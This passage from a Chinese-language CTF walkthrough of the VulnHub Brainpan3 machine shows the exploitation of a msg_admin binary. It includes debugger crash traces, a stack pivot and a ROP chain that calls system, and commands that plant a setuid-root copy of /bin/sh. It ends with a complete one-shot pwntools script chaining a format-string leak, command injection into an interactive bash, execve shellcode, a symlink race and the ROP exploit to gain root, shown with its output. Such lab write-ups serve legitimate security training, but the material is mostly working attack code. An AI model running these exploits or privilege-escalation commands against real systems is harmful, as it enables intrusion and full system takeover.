<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r 1 pwn.msg </span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/msg_admin 1 pwn.msg</span><br><span class="line">[+] Recording 3 entries</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0xf7e70bb2 <span class="keyword">in</span> ?? () from /lib32/libc.so.6</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x62626262 (<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"> EBX  0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> ECX  0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> EDX  0x63616164 (<span class="string">&#x27;daac&#x27;</span>)</span><br><span class="line"> EDI  0xf7fb5000 ◂— 0x1d6d6c</span><br><span class="line"> ESI  0xffffd250 —▸ 0xf7ffdab0 —▸ 0xf7fce3e0 —▸ 0xf7ffd950 ◂— 0x0</span><br><span class="line"> EBP  0xffffd2e8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd0bc —▸ 0x8048cd0 (main+539) ◂— mov    eax, dword ptr [ebp - 0x4c]</span><br><span class="line"> EIP  0xf7e70bb2 ◂— mov    dword ptr [edx], eax</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line"> ► 0xf7e70bb2    mov    dword ptr [edx], eax</span><br><span class="line">   0xf7e70bb4    mov    al, byte ptr [ecx + 4]</span><br><span class="line">   0xf7e70bb7    mov    byte ptr [edx + 4], al</span><br><span class="line">   0xf7e70bba    mov    eax, edx</span><br><span class="line">   0xf7e70bbc    ret    </span><br><span class="line"> </span><br><span class="line">   0xf7e70bbd    lea    esi, [esi]</span><br><span class="line">   0xf7e70bc0    mov    eax, dword ptr [ecx]</span><br><span class="line">   0xf7e70bc2    mov    dword ptr [edx], eax</span><br><span class="line">   0xf7e70bc4    mov    ax, word ptr [ecx + 4]</span><br><span class="line">   0xf7e70bc8    mov    word ptr [edx + 4], ax</span><br><span class="line">   0xf7e70bcc    mov    eax, edx</span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd0bc —▸ 0x8048cd0 (main+539) ◂— mov    eax, dword ptr [ebp - 0x4c]</span><br><span class="line">01:0004│      0xffffd0c0 ◂— <span class="string">&#x27;daac&#x27;</span></span><br><span class="line">02:0008│      0xffffd0c4 —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">03:000c│      0xffffd0c8 —▸ 0x804c1a0 ◂— 0xfbad2488</span><br><span class="line">04:0010│      0xffffd0cc ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">05:0014│      0xffffd0d0 ◂— <span class="string">&#x27;baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">06:0018│      0xffffd0d4 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">07:001c│      0xffffd0d8 ◂— <span class="string">&#x27;daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 f7e70bb2</span><br><span class="line">   f 1  8048cd0 main+539</span><br><span class="line">   f 2 f7dfc811 __libc_start_main+241</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x63616164)</span><br></pre></td></tr></table></figure>

<p>一定喜欢看到SIGSEGV，是吗？崩溃指令是mov [edx]，eax。看来正在用bbbb（eax-第二条消息）覆盖地址daac（edx-来自循环函数）中的数据。这实际上是“在哪里写”条件，在这里可以在任何地方写入4个字节的内容。查看0x8048cd0（在第1帧处的回溯），看到处于strcpy状态。在此处设置断点并重新启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn&gt; bp 0x8048ccb</span><br><span class="line"></span><br><span class="line">[---------------------------------------CODE----------------------------------------]</span><br><span class="line">=&gt; 0x8048ccb &lt;main+534&gt;    call   0x8048630 &lt;strcpy@plt&gt;</span><br><span class="line">    dest:      0x63616164 (<span class="string">&#x27;daac&#x27;</span>)</span><br><span class="line">    src:       0x804c170 &lt;-- <span class="string">&#x27;bbbb&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在崩溃点，堆栈处于以下状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[---------------------------------------STACK---------------------------------------]</span><br><span class="line">00:0000| esp  0xffffc83c --&gt; 0x8048cd0 (main+539) &lt;-- mov    eax, dword ptr [ebp - 0x4c]</span><br><span class="line">01:0004|      0xffffc840 &lt;-- 0x63616164</span><br><span class="line">02:0008|      0xffffc844 --&gt; 0x804c170 &lt;-- <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">03:000c|      0xffffc848 --&gt; 0x804c008 &lt;-- 0xfbad2488</span><br><span class="line">04:0010|      0xffffc84c &lt;-- <span class="string">&#x27;aaaabaaacaaadaa...&#x27;</span></span><br><span class="line">05:0014|      0xffffc850 &lt;-- <span class="string">&#x27;baaacaaadaaaeaa...&#x27;</span></span><br><span class="line">06:0018|      0xffffc854 &lt;-- <span class="string">&#x27;caaadaaaeaaafaa...&#x27;</span></span><br><span class="line">07:001c|      0xffffc858 &lt;-- <span class="string">&#x27;daaaeaaafaaagaa...&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在堆栈地址看到了受控缓冲区0xffffc84c,为了将ESP移至缓冲区，需要执行堆栈枢纽操作，以便启动ROP序列。<br>将bbbb设置为从binjitsu（rop.search（move = 20）.address）移动20的堆栈地址，并将daac的偏移量设置为strtok GOT条目。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;msg_admin&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">pivot = rop.search(move=20).address</span><br><span class="line">strtok = elf.got[<span class="string">&#x27;strtok&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Pivot: &#123;&#125;&quot;</span>.format(hex(pivot)))</span><br><span class="line">log.info(<span class="string">&quot;Strtok: &#123;&#125;&quot;</span>.format(hex(strtok)))</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;pwn.msg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    sc = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;daac&#x27;</span>) + p32(strtok)</span><br><span class="line">    sc += <span class="string">&#x27;B&#x27;</span> * (216 - len(sc))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;a&#x27;</span>*4, sc))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(p32(pivot), <span class="string">&#x27;B&#x27;</span>*12))</span><br></pre></td></tr></table></figure>

<p>太棒了，所以现在有了堆栈控制和EIP控制。;-)使用ROPGadget查看相关的ROP小工具。请注意，一定要增加–depth，以便可以看到更多小工具。在这种情况下，这一点很重要。没有它，将无法找到清晰的eax小工具。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --depth 30 --binary msg_admin</span><br></pre></td></tr></table></figure>

<p>列表中的两个小工具非常有趣。下面的小工具将允许使用取消引用的指针来增加eax。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret</span><br></pre></td></tr></table></figure>

<p>下一个小工具将提供清除eax的方法。请注意，从默认的ROPgadget设置–depth 10中看不到此小工具。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x08048790 : mov eax, 0x804b074 ; sub eax, 0x804b074 ; sar eax, 2 ; mov edx, eax ; shr edx, 0x1f ; add eax, edx ; sar eax, 1 ; jne 0x80487c1 ; ret</span><br></pre></td></tr></table></figure>

<p>攻击计划如下（剧透警报，几乎与每个CTF ASLR旁路相同）：</p>
<ul>
<li>引用GOT中的条目。</li>
<li>计算给定条目和系统之间的差异。</li>
<li>将此差异添加到取消引用的值中。</li>
<li>调用system（’/tmp/foo’），其中/tmp/foo包含我们的命令。</li>
</ul>
<p>因为要减少添加偏移量指令的数量，所以尝试在msg_admin中找到哪个GOT条目最接近其libc中的系统。</p>
<p>find-good-addr.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;msg_admin&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> symbol <span class="keyword">in</span> elf.symbols:</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> libc.symbols[symbol] &lt; libc.symbols[<span class="string">&#x27;system&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span> symbol, hex(libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[symbol])</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python find-good-addr.py </span><br><span class="line">__libc_start_main 0x26800</span><br><span class="line">atol 0xe900</span><br></pre></td></tr></table></figure>

<p>为了使事情更简单，将仅在GOT条目中添加正值。使用atol条目，因为它与系统的差异最小。接下来，需要在二进制文件中找到偏移量，该偏移量累积时等于0xe900。下面是一个可能的列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x8048595 = 0xc6e8</span><br><span class="line">0x8048dff = 0x2203</span><br><span class="line">0x8048833 = 0x14</span><br><span class="line">0x8048fb9 = 0x1</span><br></pre></td></tr></table></figure>

<p>现在有了系统偏移量，只需要一个小工具即可执行它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x8048786 : call eax;</span><br></pre></td></tr></table></figure>

<p>注意到在用法语句中找到了字符串/tmp/foo。利用它并将其用作执行命令。需要一个或两个命令，当以root身份执行时，将给一个shell。一种方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /bin/sh /tmp/pwned;</span><br><span class="line">chown root /tmp/pwned;</span><br><span class="line">chmod 4777 /tmp/pwned;</span><br></pre></td></tr></table></figure>

<p>需要将setuid位（4777）设置为puck，以便在root特权下执行二进制文件。一切准备就绪，检查一下最终的ROP链。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">def add_offset(addr):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;Function used to easily add offsets to eax to global rop chain&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    add_to_sum = 0x08048feb</span><br><span class="line">    rop.raw(pop_ebx)</span><br><span class="line">    rop.raw(addr - 0x1270304)</span><br><span class="line">    rop.raw(add_to_sum)</span><br><span class="line"></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">tmpfoo = elf.search(<span class="string">&#x27;/tmp/foo&#x27;</span>).next()</span><br><span class="line">atol = elf.got[<span class="string">&#x27;atol&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_ebx = 0x804859d</span><br><span class="line">call_eax = 0x8048786</span><br><span class="line"></span><br><span class="line">hex_c6e8 = 0x8048595</span><br><span class="line">hex_2203 = 0x8048dff</span><br><span class="line">hex_14 = 0x8048833</span><br><span class="line">hex_1 = 0x8048fb9</span><br><span class="line"></span><br><span class="line">rop.raw(0x8048790)</span><br><span class="line"></span><br><span class="line">add_offset(atol)</span><br><span class="line">add_offset(hex_c6e8)</span><br><span class="line">add_offset(hex_2203)</span><br><span class="line">add_offset(hex_14)</span><br><span class="line">add_offset(hex_1)</span><br><span class="line"></span><br><span class="line">rop.raw(call_eax)    </span><br><span class="line">rop.raw(tmpfoo)</span><br></pre></td></tr></table></figure>

<p>根据先前的挑战，需要通过binjitsu执行这些挑战。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r.sendline(<span class="string">&#x27;echo &quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot; &gt; /tmp/foo&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sc = str(rop)</span><br><span class="line">sc += cyclic(cyclic_find(<span class="string">&#x27;daac&#x27;</span>)-len(sc))</span><br><span class="line">sc += p32(strtok)</span><br><span class="line">sc += <span class="string">&#x27;C&#x27;</span> * (216 - len(sc))</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;s&#x27;</span>*4, sc) </span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(p32(pivot), str(rop))</span><br><span class="line"></span><br><span class="line">pwnmsg_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">    pwnmsg_file += <span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(b.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;python -c &quot;print &#x27;</span>&#123;&#125;<span class="string">&#x27;&quot; &gt;&gt; /opt/.messenger/pwn.msg&#x27;</span><span class="string">&#x27;&#x27;</span>.format(pwnmsg_file))</span><br></pre></td></tr></table></figure>

<p>下面是完善后的一键获取root权限并且拿到flag的python脚本，运行一下看看效果。。。</p>
<p>bp3.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;reynard&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: reynard&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;&quot;</span><span class="string">&quot; echo &quot;</span></span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import telnetlib</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = 7075</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">subprocess.check_output([<span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r = socket.socket()</span><br><span class="line">r.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">os.symlink(<span class="string">&#x27;/home/puck/key.txt&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = r</span><br><span class="line">t.interact()</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line"><span class="string">&quot; &gt; win.py</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;python win.py&quot;</span>)</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">log.success(<span class="string">&quot;Shell received: &#123;&#125;&quot;</span>.format(output))</span><br><span class="line">sleep(1)</span><br><span class="line">log.success(<span class="string">&quot;Insert ROP pun here...&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;msg_admin&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">pivot = rop.search(move=20).address</span><br><span class="line">strtok = elf.got[<span class="string">&#x27;strtok&#x27;</span>]</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">def add_offset(addr):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;Function used to easily add offsets to eax to global rop chain&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    add_to_sum = 0x08048feb</span><br><span class="line">    rop.raw(pop_ebx)</span><br><span class="line">    rop.raw(addr - 0x1270304)</span><br><span class="line">    rop.raw(add_to_sum)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">tmpfoo = elf.search(<span class="string">&#x27;/tmp/foo&#x27;</span>).next()</span><br><span class="line">atol = elf.got[<span class="string">&#x27;atol&#x27;</span>]</span><br><span class="line">pop_ebx = 0x804859d</span><br><span class="line">call_eax = 0x8048786</span><br><span class="line">hex_c6e8 = 0x8048595</span><br><span class="line">hex_2203 = 0x8048dff</span><br><span class="line">hex_14 = 0x8048833</span><br><span class="line">hex_1 = 0x8048fb9</span><br><span class="line">rop.raw(0x8048790)</span><br><span class="line">add_offset(atol)</span><br><span class="line">add_offset(hex_c6e8)</span><br><span class="line">add_offset(hex_2203)</span><br><span class="line">add_offset(hex_14)</span><br><span class="line">add_offset(hex_1)</span><br><span class="line">rop.raw(call_eax)    </span><br><span class="line">rop.raw(tmpfoo)</span><br><span class="line">r.sendline(<span class="string">&#x27;echo &quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot; &gt; /tmp/foo&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Create our root command file at /tmp/foo&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;echo &quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot; &gt; /tmp/foo&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br><span class="line">sc = str(rop)</span><br><span class="line">sc += cyclic(cyclic_find(<span class="string">&#x27;daac&#x27;</span>)-len(sc))</span><br><span class="line">sc += p32(strtok)</span><br><span class="line">sc += <span class="string">&#x27;C&#x27;</span> * (216 - len(sc))</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;s&#x27;</span>*4, sc) </span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(p32(pivot), str(rop))</span><br><span class="line">pwnmsg_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">    pwnmsg_file += <span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(b.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;python -c &quot;print &#x27;</span>&#123;&#125;<span class="string">&#x27;&quot; &gt;&gt; /opt/.messenger/pwn.msg&#x27;</span><span class="string">&#x27;&#x27;</span>.format(pwnmsg_file))</span><br><span class="line">log.info(<span class="string">&#x27;Create our malicious msg file&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;python -c &quot;print &#x27;</span>&#123;&#125;<span class="string">&#x27;&quot; &gt;&gt; /opt/.messenger/pwn.msg&#x27;</span><span class="string">&#x27;&#x27;</span>.format(pwnmsg_file))</span><br><span class="line">r.sendline(<span class="string">&#x27;rm /tmp/pwned&#x27;</span>)</span><br><span class="line">r.clean()</span><br><span class="line">log.info(<span class="string">&quot;Wait for your r00t shellz&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(75):</span><br><span class="line">    r.sendline(<span class="string">&#x27;ls -la /opt/.messenger&#x27;</span>)</span><br><span class="line">    sleep(1)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;pwn.msg&#x27;</span> not <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">r.sendline(<span class="string">&#x27;/tmp/pwned&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /root&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;gzip -d brainpan.8.gz&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat brainpan.8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(10):</span><br><span class="line">    r.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Bingo!&quot;</span>)</span><br><span class="line">log.info(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>直接获得root权限和flag，灰常的牛批。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 8455</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 108&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: reynard</span><br><span class="line">[+] Shell received: Authentication successful</span><br><span class="line">[+] Insert ROP pun here...</span><br><span class="line">[*] <span class="string">&#x27;/root/vulnhub/brainpan3/2/msg_admin&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Loaded 10 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;msg_admin&#x27;</span></span><br><span class="line">[*] Create our root <span class="built_in">command</span> file at /tmp/foo</span><br><span class="line">[*] <span class="built_in">echo</span> <span class="string">&quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot;</span> &gt; /tmp/foo</span><br><span class="line">[*] chmod +x /tmp/foo</span><br><span class="line">[*] Create our malicious msg file</span><br><span class="line">[*] python -c <span class="string">&quot;print 